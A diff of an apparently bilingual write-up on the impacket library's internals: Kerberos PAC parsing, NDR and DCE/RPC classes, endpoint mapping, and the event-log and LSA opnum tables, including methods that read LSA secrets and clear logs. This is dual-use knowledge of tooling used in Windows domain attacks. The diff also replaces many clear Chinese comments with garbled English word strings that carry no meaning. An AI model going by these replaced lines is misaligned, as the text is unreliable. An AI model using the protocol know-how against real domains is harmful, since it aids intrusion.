-# 两个PAC_SIGNATURE_DATA结构附加到存储服务器和KDC签名的 PAC。这些结构位于最顶层PACTYPE 结构的Buffers数组之后，位于Buffers数组中每个相应PAC_INFO_BUFFER 结构的Offset字段中指定的偏移处 。服务端签名对应的PAC_INFO_BUFFER的ulType字段包含值0x00000006和PAC_INFO_BUFFER的ulType字段对应于 KDC 签名包含值 0x00000007。只有当 PAC 被[MS-KILE] 协议使用时才能生成 PAC 签名，因为用于创建和验证签名的密钥是 KDC 已知的密钥。没有其他协议可以使用这些 PAC 签名。
+# PAC_SIGNATURE_DATAserverKDC PACPACTYPE BuffersgroupBuffersgroupPAC_INFO_BUFFER Offsetspecified PAC_INFO_BUFFERulTypecontaining0x00000006PAC_INFO_BUFFERulType KDC containing 0x00000007 PAC is[MS-KILE] PAC asused for KDC can PAC
     
 class S4U_DELEGATION_INFO(NDRSTRUCT):
-# S4U_DELEGATION_INFO结构用于约束委托信息。它列出了通过此 Kerberos 客户端和后续服务或服务器委托的服务。该列表仅用于用户代理服务 (S4U2proxy)请求。此功能可以在服务之间连续使用多次，这对于审计目的很有用。
+# S4U_DELEGATION_INFOused forinformation outputthis Kerberos clientorserverthelistused foruser (S4U2proxy)thiscanin
     
 class UPN_DNS_INFO(Structure):
-# 包含客户端的 UPN、 完全限定的域名 (FQDN)、SAM 名称（可选）和 SID（可选）。它用于提供与票据的客户端对应的 UPN、FQDN、SAM 名称和 SID。UPN_DNS_INFO结构直接放置在最顶层 PACTYPE 结构的缓冲区数组之后，位于缓冲区数组中相应 PAC_INFO_BUFFER结构的偏移字段中指定的偏移处 。对应PAC_INFO_BUFFER的ulType字段设置为 0x0000000C。
+# containingclient UPN realm (FQDN)SAM name SIDused forwithticketclient UPNFQDNSAM name SIDUPN_DNS_INFOin PACTYPE groupgroup PAC_INFO_BUFFERspecified PAC_INFO_BUFFERulTypesetsas 0x0000000C
     
 class PAC_CLIENT_CLAIMS_INFO(Structure):
-# 是 PAC 的可变长度缓冲区，应该包含客户端的编组声明 blob。PAC_CLIENT_CLAIMS_INFO 结构直接放置在最顶层 PACTYPE结构的Buffers 数组之后,位于Buffers数组中相应PAC_INFO_BUFFER 结构的Offset字段中指定的偏移处 。相应的PAC_INFO_BUFFER的ulType字段设置为 0x0000000D
+# PAC thecontainingclientgroup blobPAC_CLIENT_CLAIMS_INFO in PACTYPEBuffers group,BuffersgroupPAC_INFO_BUFFER Offsetspecified PAC_INFO_BUFFERulTypesetsas 0x0000000D
     
 class PAC_DEVICE_INFO(NDRSTRUCT):
-# 是 PAC 的可变长度缓冲区，应该包含DC提供的设备的登录和授权信息。指向PAC_DEVICE_INFO结构的指针被序列化为一个字节数组，并直接放置在最顶层PACTYPE 结构的缓冲区数组之后，位于缓冲区中相应PAC_INFO_BUFFER 结构的偏移字段中指定的偏移处。相应的PAC_INFO_BUFFER的ulType字段设置为 0x0000000E。
+# PAC thecontainingDCinformationPAC_DEVICE_INFOisasgroupinPACTYPE groupPAC_INFO_BUFFER specifiedPAC_INFO_BUFFERulTypesetsas 0x0000000E
     
 class PAC_DEVICE_CLAIMS_INFO(Structure):
-# PAC 的可变长度缓冲区，应该包含客户端的编组声明blob。PAC_DEVICE_CLAIMS_INFO 结构直接放置在最顶层 PACTYPE 结构的 Buffers 数组之后 ，位于Buffers数组中相应PAC_INFO_BUFFER 结构的Offset字段中指定的偏移处 。相应的PAC_INFO_BUFFER的ulType字段设置为 0x0000000F
+# PAC thecontainingclientgroupblobPAC_DEVICE_CLAIMS_INFO in PACTYPE Buffers group BuffersgroupPAC_INFO_BUFFER Offsetspecified PAC_INFO_BUFFERulTypesetsas 0x0000000F
     
 class VALIDATION_INFO(TypeSerialization1):
 ```
@@ -1369,6 +1095,7 @@ class VALIDATION_INFO(TypeSerialization1):
 class S4U2SELF:
 
     def printPac(self, data):
+        # (1) decode the ticket enc-part and pull the PAC out through AD_IF_RELEVANT
         encTicketPart = decoder.decode(data, asn1Spec=EncTicketPart())[0]
         adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[
             0]
@@ -1376,48 +1103,33 @@ class S4U2SELF:
         pacType = PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
         buff = pacType['Buffers']
 
+        # (2) walk the PAC_INFO_BUFFERs and dispatch by ulType
         for bufferN in range(pacType['cBuffers']):
             infoBuffer = PAC_INFO_BUFFER(buff)
             data = pacType['Buffers'][infoBuffer['Offset']-8:][:infoBuffer['cbBufferSize']]
             if logging.getLogger().level == logging.DEBUG:
                 print("TYPE 0x%x" % infoBuffer['ulType'])
             if infoBuffer['ulType'] == 1:
+                # (3) logon info (KERB_VALIDATION_INFO): skip the 4-byte pointer ReferentID, then parse the NDR structure
                 type1 = TypeSerialization1(data)
-                # I'm skipping here 4 bytes with its the ReferentID for the pointer
                 newdata = data[len(type1)+4:]
                 kerbdata = KERB_VALIDATION_INFO()
                 kerbdata.fromString(newdata)
                 kerbdata.fromStringReferents(newdata[len(kerbdata.getData()):])
                 kerbdata.dump()
-                print()
                 print('Domain SID:', kerbdata['LogonDomainId'].formatCanonical())
-                print()
+            # the remaining types (CLIENT_INFO / SERVER_CHECKSUM / PRIVSVR_CHECKSUM / UPN_DNS_INFO)
+            # only dump in DEBUG mode and share the same shape as above — omitted
             elif infoBuffer['ulType'] == PAC_CLIENT_INFO_TYPE:
-                clientInfo = PAC_CLIENT_INFO(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    clientInfo.dump()
-                    print()
+                ......
             elif infoBuffer['ulType'] == PAC_SERVER_CHECKSUM:
-                signatureData = PAC_SIGNATURE_DATA(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    signatureData.dump()
-                    print()
+                ......
             elif infoBuffer['ulType'] == PAC_PRIVSVR_CHECKSUM:
-                signatureData = PAC_SIGNATURE_DATA(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    signatureData.dump()
-                    print()
+                ......
             elif infoBuffer['ulType'] == PAC_UPN_DNS_INFO:
-                upn = UPN_DNS_INFO(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    upn.dump()
-                    print(data[upn['DnsDomainNameOffset']:])
-                    print()
+                ......
             else:
                 hexdump(data)
-
-            if logging.getLogger().level == logging.DEBUG:
-                print("#"*80)
 
             buff = buff[len(infoBuffer):]
 ```
@@ -1493,7 +1205,7 @@ interface INTERFACENAME
 
 For a complete RPC programming walkthrough see: https://developer.aliyun.com/article/258886
 
-### ndr.py
+### ndr.py — NDR Data Representation & Serialization
 
 Microsoft uses the NDR (Network Data Representation) engine to marshal (think serialize / deserialize) the data flowing between client and server stubs in RPC and DCOM. One purpose of IDL is to provide the syntax for describing those structured types and values. The RPC protocol, however, specifies that inputs and outputs travel as octet streams; NDR provides the mapping from IDL data types to octet streams, defining primitive types, constructed types and their representations within the stream.
 
@@ -1537,57 +1249,57 @@ class NETLOGON_SECURE_CHANNEL_TYPE(NDRENUM):
 
 Readers interested in NDR structured data can consult: https://pubs.opengroup.org/onlinepubs/9629399/chap14.htm
 
-### [MS-DTYP]dtypes.py
+### [MS-DTYP] dtypes.py — RPC Basic Data Types (DWORD / BOOL)
 
 Defines the basic data types used in protocol communication — DWORD, BOOL and so on; see the document for the full list.
 
 https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/cca27429-5689-4a16-b2b4-9325d93e4ba2
 
-### [MS-RPCE]rpcrt.py
+### [MS-RPCE] rpcrt.py — DCERPC Runtime Core (header / bind / DCERPC class)
 
 Mainly the static variables, tag parameters, headers and other data structures involved in DCE/RPC communication:
 
 ```
-+ DCERPCException 错误处理类
-+ CtxItem 上下文对象
-+ CtxItemResult 上下文请求结果
-+ sec_trailer auth_length字段的非零值表示存在由安全提供者提供的身份验证信息。当auth_length字段不为零时，必须存在sec_trailer 结构
-+ MSRPCHeader microsoft rpc 的header结构
-+ MSRPCRequestHeader  microsoft rpc 请求的header结构
-+ MSRPCRespHeader microsoft rpc 响应的header结构
-+ MSRPCBind RPC绑定上下文对象
-	- addCtxItem 添加上下文对象
-	- getData 遍历上下文对象
-+ MSRPCBindAck 应答型rpc绑定
-+ MSRPCBindNak 无应答rpc绑定
-+ DCERPC       Distributed Computing Environment/Remote Procedure Calls（分布式计算环境远程过程调用），协商 NDR 传输语法：8a885d04-1ceb-11c9-9fe8-08002b104860 对应 NDR 2.0 传输语法，71710533-BEBA-4937-8319-B5DBEF9CCC36 对应 NDR64 传输语法
-	- connect rpc连接
-	- get_rpc_transport获取rpc端口等关键方法
-	- call设置pdu（协议数据单元）数据段，
-	- request发送请求，
-	- get_credentials获取凭证，
-	- set_credentials设置凭证，
-	- bind RPC 绑定
-	- send 调用_transport_send发送rpc请求
-	- alter_ctx 更新为新的上下文对象
-+ DCERPC_RawCall 给 PDU 的 data 字段赋值
-+ CommonHeader 共同的header
-+ PrivateHeader 私有header
-+ TypeSerialization1 指定ndr序列化标准
++ DCERPCException
++ CtxItem onobject
++ CtxItemResult on
++ sec_trailer auth_lengthininformationauth_lengthnotasmustinsec_trailer
++ MSRPCHeader microsoft rpc header
++ MSRPCRequestHeader microsoft rpc header
++ MSRPCRespHeader microsoft rpc header
++ MSRPCBind RPConobject
+	- addCtxItem addsonobject
+	- getData onobject
++ MSRPCBindAck rpc
++ MSRPCBindNak rpc
++ DCERPC Distributed Computing Environment/Remote Procedure Calls NDR 8a885d04-1ceb-11c9-9fe8-08002b104860 NDR 2.0 71710533-BEBA-4937-8319-B5DBEF9CCC36 NDR64
+	- connect rpc
+	- get_rpc_transportobtainsrpcmethod
+	- callsetspdu
+	- request
+	- get_credentialsobtains
+	- set_credentialssets
+	- bind RPC
+	- send _transport_sendrpc
+	- alter_ctx asonobject
++ DCERPC_RawCall PDU data
++ CommonHeader header
++ PrivateHeader header
++ TypeSerialization1 specifiedndr
 ```
 
 ![Type Serialization Version 1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/ms-rpce_files/image015.png)
 
 ```python
-+ DCERPCServer 简易的 RPC 服务器，impacket 的 smbserver.py 借助它在内置 SMB 服务器上响应命名管道中的 RPC 请求
-	- addCallbacks 回应请求的回调函数
++ DCERPCServer RPC serverimpacket smbserver.py in SMB serveron RPC
+	- addCallbacks
 	- setListenPort
 	- getListenPort
-	- recv 接收请求，函数返回值为接收的数据
-	- run 开启服务器监听
+	- recv returnsas
+	- run server
 	- send 
 	- bind
-	- processRequest 处理请求
+	- processRequest
 	
 # eg./impacket/smbserver.py
 class WKSTServer(DCERPCServer):
@@ -1599,7 +1311,7 @@ class WKSTServer(DCERPCServer):
         self.addCallbacks(('6BFFD098-A112-3610-9833-46C3F87E345A', '1.0'), '\\PIPE\\wkssvc', self.wkssvcCallBacks)
 ```
 
-### enum.py
+### enum.py — Python Enum Base Class (NDRENUM foundation)
 
 Python enumeration base module; NDR enumerations such as NDRENUM are built on it.
 
@@ -1607,10 +1319,10 @@ Python enumeration base module; NDR enumerations such as NDRENUM are built on it
 
 Those are the foundation modules of MSRPC communication in impacket; the rest of this chapter covers the Python module (the .py file) for each RPC interface.
 
-### [MS-RPC-EPM]epm.py
+### [MS-RPC-EPM] epm.py — Endpoint Mapper (hept_map endpoint resolution)
 
 ```
-Microsoft 远程过程调用 (RPC) 端点映射器 (EPM) 协议。这是基于 TCP/UDP 端口的服务，包括 TCP/UDP 端口 135。此表中的所有其他服务/组都是基于 UUID 的。
+Microsoft (RPC) (EPM) TCP/UDP including TCP/UDP 135thisall/group UUID
 ```
 
 The module lists a large set of known UUID-to-DLL/RPC-interface mappings; its main function is hept_map (a historic impacket spelling of ept_map) which resolves the string binding of an RPC endpoint from an interface UUID, supporting ncacn_np, ncacn_ip_tcp and ncacn_http:
@@ -1618,6 +1330,7 @@ The module lists a large set of known UUID-to-DLL/RPC-interface mappings; its ma
 ```python
 def hept_map(destHost, remoteIf, dataRepresentation = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')), protocol = 'ncacn_np', dce=None):
 
+    # (1) Without an existing dce connection, first bind the EPM interface on target port 135
     if dce is None:
         stringBinding = r'ncacn_ip_tcp:%s[135]' % destHost
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
@@ -1627,24 +1340,24 @@ def hept_map(destHost, remoteIf, dataRepresentation = uuidtup_to_bin(('8a885d04-
     else:
         disconnect = False
 
-
     dce.bind(MSRPC_UUID_PORTMAP)
 
+    # (2) Assemble the EPMTower (endpoint tower): interface floor + NDR data-representation floor + protocol floor + transport floor
     tower = EPMTower()
     interface = EPMRPCInterface()
-
     interface['InterfaceUUID'] = remoteIf[:16]
     interface['MajorVersion'] = unpack('<H', remoteIf[16:][:2])[0]
     interface['MinorVersion'] = unpack('<H', remoteIf[18:])[0]
 
     dataRep = EPMRPCDataRepresentation()
     dataRep['DataRepUuid'] = dataRepresentation[:16]
-    dataRep['MajorVersion'] = unpack('<H', dataRepresentation[16:][:2])[0]
-    dataRep['MinorVersion'] = unpack('<H', dataRepresentation[18:])[0]
+    ......
 
     protId = EPMProtocolIdentifier()
     protId['ProtIdentifier'] = FLOOR_RPCV5_IDENTIFIER
 
+    # (3) The transport floor is built per target protocol (ncacn_np: pipe name + host name;
+    #     ncacn_ip_tcp / ncacn_http: port + address, same shape — omitted here)
     if protocol == 'ncacn_np':
         pipeName = EPMPipeName()
         pipeName['PipeName'] = b'\x00'
@@ -1652,78 +1365,37 @@ def hept_map(destHost, remoteIf, dataRepresentation = uuidtup_to_bin(('8a885d04-
         hostName = EPMHostName()
         hostName['HostName'] = b('%s\x00' % destHost)
         transportData = pipeName.getData() + hostName.getData()
-
-    elif protocol == 'ncacn_ip_tcp':
-        portAddr = EPMPortAddr()
-        portAddr['IpPort'] = 0
-
-        hostAddr = EPMHostAddr()
-        import socket
-        hostAddr['Ip4addr'] = socket.inet_aton('0.0.0.0')
-        transportData = portAddr.getData() + hostAddr.getData()
-    elif protocol == 'ncacn_http':
-        portAddr = EPMPortAddr()
-        portAddr['PortIdentifier'] = FLOOR_HTTP_IDENTIFIER
-        portAddr['IpPort'] = 0
-
-        hostAddr = EPMHostAddr()
-        import socket
-        hostAddr['Ip4addr'] = socket.inet_aton('0.0.0.0')
-        transportData = portAddr.getData() + hostAddr.getData()
-
-    else:
-        LOG.error('%s not support for hetp_map()' % protocol)
-        if disconnect is True:
-            dce.disconnect()
-        return None
+    elif protocol in ('ncacn_ip_tcp', 'ncacn_http'):
+        ......
 
     tower['NumberOfFloors'] = 5
     tower['Floors'] = interface.getData() + dataRep.getData() + protId.getData() + transportData
 
+    # (4) Send the ept_map request (on Windows 2003 the Referent IDs must be fixed to 1/2)
     request = ept_map()
     request['max_towers'] = 1
     request['map_tower']['tower_length'] = len(tower)
     request['map_tower']['tower_octet_string'] = tower.getData()
-
-    # Under Windows 2003 the Referent IDs cannot be random
-    # they must have the following specific values
-    # otherwise we get a rpc_x_bad_stub_data exception
     request.fields['obj'].fields['ReferentID'] = 1
     request.fields['map_tower'].fields['ReferentID'] = 2
 
     resp = dce.request(request)
 
+    # (5) Parse the endpoint string binding from floor 4 of the returned tower
     tower = EPMTower(b''.join(resp['ITowers'][0]['Data']['tower_octet_string']))
-    # Now let's parse the result and return an stringBinding
-    result = None
     if protocol == 'ncacn_np':
-        # Pipe Name should be the 4th floor
-        pipeName = EPMPipeName(tower['Floors'][3].getData())
+        pipeName = EPMPipeName(tower['Floors'][3].getData())         # pipe name lives on the 4th floor
         result = 'ncacn_np:%s[%s]' % (destHost, pipeName['PipeName'].decode('utf-8')[:-1])
-    elif protocol == 'ncacn_ip_tcp':
-        # Port Number should be the 4th floor
-        portAddr = EPMPortAddr(tower['Floors'][3].getData())
-        result = 'ncacn_ip_tcp:%s[%s]' % (destHost, portAddr['IpPort'])
-    elif protocol == 'ncacn_http':
-        # Port Number should be the 4th floor
-        portAddr = EPMPortAddr(tower['Floors'][3].getData())
-        result = 'ncacn_http:%s[%s]' % (destHost, portAddr['IpPort'])
+    elif protocol in ('ncacn_ip_tcp', 'ncacn_http'):
+        portAddr = EPMPortAddr(tower['Floors'][3].getData())          # port number lives on the 4th floor
+        ......
+
     if disconnect is True:
         dce.disconnect()
     return result
-
-
-# eg./examples/ntlmrelayx/clients/rpcrelayclient.py
-
-from impacket.dcerpc.v5 import transport, rpcrt, epm, tsch
-from impacket.dcerpc.v5.ndr import NDRCALL
-from impacket.dcerpc.v5.rpcrt import DCERPC_v5, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck, \
-            LOG.debug("Connecting to ncacn_ip_tcp:%s[135] to determine %s stringbinding" % (target.netloc, self.endpoint))
-            self.stringbinding = epm.hept_map(target.netloc, self.endpoint_uuid, protocol='ncacn_ip_tcp')
-    	......
 ```
 
-### transport.py
+### transport.py — RPC Transport Layer (TCP / UDP / HTTP / SMB)
 
 Implements the DCE/RPC transport layer: DCERPCTransportFactory builds RPC connections over TCP, UDP, HTTP and SMB (named pipes) from a string binding.
 
@@ -1790,7 +1462,7 @@ Using examples/psexec.py, DCERPCTransportFactory establishes the RPC connection 
         self.doStuff(rpctransport)
 ```
 
-### [MS-EVEN / MS-EVEN6] even.py / even6.py
+### [MS-EVEN / MS-EVEN6] even.py / even6.py — Remote Event Log Reading
 
 The EventLog Remoting Protocol exposes RPC methods to read events from live and backed-up event logs on remote machines; the 6 in even6 means version 6 (MS-EVEN6). It reads events from [live event logs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/e74c8719-c30e-4f7a-bef7-82753cc0e159#gt_3c0e011b-e37d-40ef-90d6-1ed516f06b1c) and [backed-up event logs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/e74c8719-c30e-4f7a-bef7-82753cc0e159#gt_ddd2e7db-ea8f-4488-ac5f-e77d59abe9e4) on remote computers. The protocol also specifies how to obtain general log information such as record count, oldest record and whether the log is full, and can clear and back up both kinds of [event logs](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/e74c8719-c30e-4f7a-bef7-82753cc0e159#gt_bb3fad7e-60bf-46d4-9c3f-7caea47a743e).
 
@@ -1798,16 +1470,16 @@ The methods implemented by the two versions:
 
 ```
 OPNUMS = {
-    0   : (ElfrClearELFW, ElfrClearELFWResponse),方法指示服务器清除事件日志，并且可以选择在清除操作发生之前备份事件日志。
-    1   : (ElfrBackupELFW, ElfrBackupELFWResponse),方法指示服务器将事件日志备份到指定的文件名。
-    2   : (ElfrCloseEL, ElfrCloseELResponse),方法指示服务器关闭事件日志的句柄
-    4   : (ElfrNumberOfRecords, ElfrNumberOfRecordsResponse), 方法指示服务器报告事件日志中当前的记录数。
+ 0 : (ElfrClearELFW, ElfrClearELFWResponse),Instructs the server toeventlogcanineventlog
+ 1 : (ElfrBackupELFW, ElfrBackupELFWResponse),Instructs the server toeventlogspecified
+    2   : (ElfrCloseEL, ElfrCloseELResponse),Instructs the server tocloseseventloghandle
+ 4 : (ElfrNumberOfRecords, ElfrNumberOfRecordsResponse), Instructs the server toeventlogcurrent
     5   : (ElfrOldestRecord, ElfrOldestRecordResponse),
-    7   : (ElfrOpenELW, ElfrOpenELWResponse),指示服务器返回备份事件日志的句柄。调用者必须具有读取包含备份事件日志的文件的权限才能成功。注意 服务器有一个访问控制列表 (ACL)，用于控制对日志的访问。该协议没有读取或设置该 ACL 的方法。
-    8   : (ElfrRegisterEventSourceW, ElfrRegisterEventSourceWResponse),方法指示服务器将服务器上下文句柄返回到事件日志以供写入
-    9   : (ElfrOpenBELW, ElfrOpenBELWResponse),方法指示服务器返回备份事件日志的句柄。
-    10  : (ElfrReadELW, ElfrReadELWResponse),方法从事件日志中读取事件；服务器将这些事件传输到客户端，并在与在LogHandle参数中传递的服务器上下文句柄关联的事件日志中提高读者的位置。
-    11  : (ElfrReportEventW, ElfrReportEventWResponse), 方法将事件写入事件日志；服务器从客户端接收这些事件。
+    7   : (ElfrOpenELW, ElfrOpenELWResponse),
+ 8 : (ElfrRegisterEventSourceW, ElfrRegisterEventSourceWResponse),Instructs the server toserveronhandlereturnseventlog entry
+ 9 : (ElfrOpenBELW, ElfrOpenBELWResponse),Instructs the server toreturnseventloghandle
+ 10 : (ElfrReadELW, ElfrReadELWResponse),methodeventlogeventservereventclientinwithinLogHandleserveronhandleeventlog
+ 11 : (ElfrReportEventW, ElfrReportEventWResponse), method event entryeventlogserverclientevent
 }
 ```
 
@@ -1815,16 +1487,16 @@ even6.py (version 6):
 
 ```
 OPNUMS = {
-    5   : (EvtRpcRegisterLogQuery, EvtRpcRegisterLogQueryResponse),用于查询一个或多个通道。它还可以用于查询特定文件。事件的实际检索是通过随后调用EvtRpcQueryNext（第 3.1.4.13 节） 方法完成的。
-    11  : (EvtRpcQueryNext,  EvtRpcQueryNextResponse),客户端使用 EvtRpcQueryNext (Opnum 11) 方法从查询结果集中获取下一批记录。
-    12  : (EvtRpcQuerySeek, EvtRpcQuerySeekResponse),客户端使用 EvtRpcQuerySeek (Opnum 12) 方法在结果集中移动查询游标。
-    13  : (EvtRpcClose, EvtRpcCloseResponse),客户端使用 EvtRpcClose (Opnum 13) 方法关闭由本协议中的其他方法打开的上下文句柄。
-    17  : (EvtRpcOpenLogHandle, EvtRpcOpenLogHandle), 方法获取有关通道或备份事件日志的信息。
-    19  : (EvtRpcGetChannelList, EvtRpcGetChannelListResponse),EvtRpcGetChannelList (Opnum 19) 方法用于枚举可用频道集。
+ 5 : (EvtRpcRegisterLogQuery, EvtRpcRegisterLogQueryResponse),used forqueriesorcanused forquerieseventretrievesEvtRpcQueryNext 3.1.4.13 method
+ 11 : (EvtRpcQueryNext, EvtRpcQueryNextResponse),client EvtRpcQueryNext (Opnum 11) methodqueriesobtains
+ 12 : (EvtRpcQuerySeek, EvtRpcQuerySeekResponse),client EvtRpcQuerySeek (Opnum 12) methodinqueries
+ 13 : (EvtRpcClose, EvtRpcCloseResponse),client EvtRpcClose (Opnum 13) methodclosesmethodopensonhandle
+ 17 : (EvtRpcOpenLogHandle, EvtRpcOpenLogHandle), methodobtainsoreventloginformation
+ 19 : (EvtRpcGetChannelList, EvtRpcGetChannelListResponse),EvtRpcGetChannelList (Opnum 19) methodused forenumerates
 }
 ```
 
-### iphlp.py
+### iphlp.py — IPv6 Tunneling (IP Helper Service)
 
 iphlpsvc.dll: iphlpsvc is the Internet Protocol Helper service on Windows; its job is to help retrieve and modify the TCP/IP network configuration of a Windows 10 PC, enabling connectivity features such as IPv6 tunneling and port proxy (`netsh interface portproxy`). Iphlpsvc is used mainly for IPv6 connectivity.
 
@@ -1840,7 +1512,7 @@ OPNUMS = {
 }
 ```
 
-### [MS-LSAD]lsad.py
+### [MS-LSAD] lsad.py — Local Security Authority (domain policy management)
 
 MS-LSAD (Local Security Authority (Domain Policy) Remote Protocol) manages machine and [domain](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/31ca2a31-0be4-4773-bcef-05ad6cd3ccfb#gt_b0276eb2-4e65-4cf1-a718-e0920a614aca) security policies. Every Windows NT-based product implements and listens on this protocol server-side in all configurations, though not every operation is meaningful in every configuration.
 
@@ -1963,41 +1635,41 @@ resp = hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES)
 Next, let's see which interface methods the module currently implements:
 
 ```python
-0 : (LsarClose, LsarCloseResponse), 方法释放先前打开的上下文句柄所持有的资源
- 2 : (LsarEnumeratePrivileges, LsarEnumeratePrivilegesResponse),方法来枚举 系统已知的所有权限。可以多次调用此方法以片段形式返回其输出
- 3 : (LsarQuerySecurityObject, LsarQuerySecurityObjectResponse),方法来查询分配给数据库对象的安全信息。它返回对象的安全描述符。
- 4 : (LsarSetSecurityObject, LsarSetSecurityObjectResponse),方法被调用以在对象上设置安全描述符。
- 6 : (LsarOpenPolicy, LsarOpenPolicyResponse),方法与LsarOpenPolicy2完全相同，不同之处在于此函数中的SystemName参数，由于其语法定义，仅包含一个字符而不是完整的字符串。此SystemName参数对任何环境中的消息处理都没有任何影响。它必须被忽略。
- 7 : (LsarQueryInformationPolicy, LsarQueryInformationPolicyResponse),方法来查询表示服务器信息策略的值。
- 8 : (LsarSetInformationPolicy, LsarSetInformationPolicyResponse),方法被调用以在服务器上设置策略。
-10 : (LsarCreateAccount, LsarCreateAccountResponse),方法被调用以在服务器的数据库中创建一个新的账户对象。
-11 : (LsarEnumerateAccounts, LsarEnumerateAccountsResponse),方法以请求服务器数据库中的账户对象列表。可以多次调用该方法以片段形式返回其输出。
-13 : (LsarEnumerateTrustedDomains, LsarEnumerateTrustedDomainsResponse),请求 服务器数据库中的受信任域对象列表。可以多次调用该方法以片段形式返回其输出。
-16 : (LsarCreateSecret, LsarCreateSecretResponse),被调用以在服务器的数据库中创建一个新的秘密对象
-17 : (LsarOpenAccount, LsarOpenAccountResponse),获得账户对象的句柄。
-18 : (LsarEnumeratePrivilegesAccount, LsarEnumeratePrivilegesAccountResponse),检索授予服务器上账户的特权列表。
-19 : (LsarAddPrivilegesToAccount, LsarAddPrivilegesToAccountResponse),向现有账户对象添加新权限。
-20 : (LsarRemovePrivilegesFromAccount, LsarRemovePrivilegesFromAccountResponse),从账户对象中删除权限。
-23 : (LsarGetSystemAccessAccount, LsarGetSystemAccessAccountResponse),检索账户对象的系统访问账户标志。系统访问账户标志被描述为账户对象数据模型的一部分
-24 : (LsarSetSystemAccessAccount, LsarSetSystemAccessAccountResponse),为账户对象设置系统访问账户标志
-28 : (LsarOpenSecret, LsarOpenSecretResponse),获得现有秘密对象的句柄
-29 : (LsarSetSecret, LsarSetSecretResponse),设置秘密对象的当前值和旧值
-30 : (LsarQuerySecret, LsarQuerySecretResponse),检索秘密对象的当前值和旧值（或以前的值） 
-31 : (LsarLookupPrivilegeValue, LsarLookupPrivilegeValueResponse),将权限的名称映射到本地唯一标识符 (LUID)，通过该标识符在服务器上已知该权限。然后可以在对其他方法（例如LsarAddPrivilegesToAccount ）的后续调用中使用特权的本地唯一值。
-32 : (LsarLookupPrivilegeName, LsarLookupPrivilegeNameResponse),将特权的 LUID 映射 到服务器上已知特权 的字符串名称
-33 : (LsarLookupPrivilegeDisplayName, LsarLookupPrivilegeDisplayNameResponse),将特权名称映射到调用者语言的显示文本字符串中
-34 : (LsarDeleteObject, LsarDeleteObjectResponse),删除公开账户对象、秘密对象或可信域对象
-35 : (LsarEnumerateAccountsWithUserRight, LsarEnumerateAccountsWithUserRightResponse),返回用户权限等于传入值的账户对象列表
-36 : (LsarEnumerateAccountRights, LsarEnumerateAccountRightsResponse),来检索与现有账户关联的权限列表。
-37 : (LsarAddAccountRights, LsarAddAccountRightsResponse),向账户对象添加新权限。如果账户对象不存在，系统将尝试创建一个。
-38 : (LsarRemoveAccountRights, LsarRemoveAccountRightsResponse),从账户对象中删除权限。
-42 : (LsarStorePrivateData, LsarStorePrivateDataResponse),存储秘密值
-43 : (LsarRetrievePrivateData, LsarRetrievePrivateDataResponse),检索秘密值
-44 : (LsarOpenPolicy2, LsarOpenPolicy2Response),打开RPC 服务器的上下文句柄。这是联系本地安全机构（域策略）远程协议数据库必须调用的第一个函数。
-46 : (LsarQueryInformationPolicy2, LsarQueryInformationPolicy2Response),查询表示服务器安全策略的值
-47 : (LsarSetInformationPolicy2, LsarSetInformationPolicy2Response),在服务器上设置策略
-50 : (LsarEnumerateTrustedDomainsEx, LsarEnumerateTrustedDomainsExResponse),枚举服务器数据库中的可信域对象 。该方法旨在多次调用以检索片段中的数据。
-53 : (LsarQueryDomainInformationPolicy, LsarQueryDomainInformationPolicyResponse),除了通过LsarQueryInformationPolicy 和LsarSetInformationPolicy2公开的设置外，还调用 LsarQueryDomainInformationPolicy 方法来检索策略设置。尽管方法名称中有术语“Domain”，但此消息的处理是使用本地数据进行的，而且，不要求此数据与 机器加入的域中的 LSA 信息有任何关系。
+0 : (LsarClose, LsarCloseResponse), methodreleasesopensonhandle
+ 2 : (LsarEnumeratePrivileges, LsarEnumeratePrivilegesResponse),method toenumerates allcanthismethodreturns output
+ 3 : (LsarQuerySecurityObject, LsarQuerySecurityObjectResponse),method toqueriesobjectinformationreturnsobject
+ 4 : (LsarSetSecurityObject, LsarSetSecurityObjectResponse),Called toinobjectonsets
+ 6 : (LsarOpenPolicy, LsarOpenPolicyResponse),methodwithLsarOpenPolicy2notinthisSystemNamecontainingnotthisSystemNamemustis
+ 7 : (LsarQueryInformationPolicy, LsarQueryInformationPolicyResponse),method toqueriesserverinformationpolicy
+ 8 : (LsarSetInformationPolicy, LsarSetInformationPolicyResponse),Called toinserveronsetspolicy。
+10 : (LsarCreateAccount, LsarCreateAccountResponse),Called toinservercreates aobject
+11 : (LsarEnumerateAccounts, LsarEnumerateAccountsResponse),methodserverobjectlistcanthemethodreturns output
+13 : (LsarEnumerateTrustedDomains, LsarEnumerateTrustedDomainsResponse),
+16 : (LsarCreateSecret, LsarCreateSecretResponse),isinservercreates aobject
+17 : (LsarOpenAccount, LsarOpenAccountResponse),
+18 : (LsarEnumeratePrivilegesAccount, LsarEnumeratePrivilegesAccountResponse),retrievesserveronlist
+19 : (LsarAddPrivilegesToAccount, LsarAddPrivilegesToAccountResponse),
+20 : (LsarRemovePrivilegesFromAccount, LsarRemovePrivilegesFromAccountResponse),
+23 : (LsarGetSystemAccessAccount, LsarGetSystemAccessAccountResponse),retrievesobjectisasobject
+24 : (LsarSetSystemAccessAccount, LsarSetSystemAccessAccountResponse),asobjectsets
+28 : (LsarOpenSecret, LsarOpenSecretResponse),
+29 : (LsarSetSecret, LsarSetSecretResponse),setsobjectcurrent
+30 : (LsarQuerySecret, LsarQuerySecretResponse),retrievesobjectcurrentor
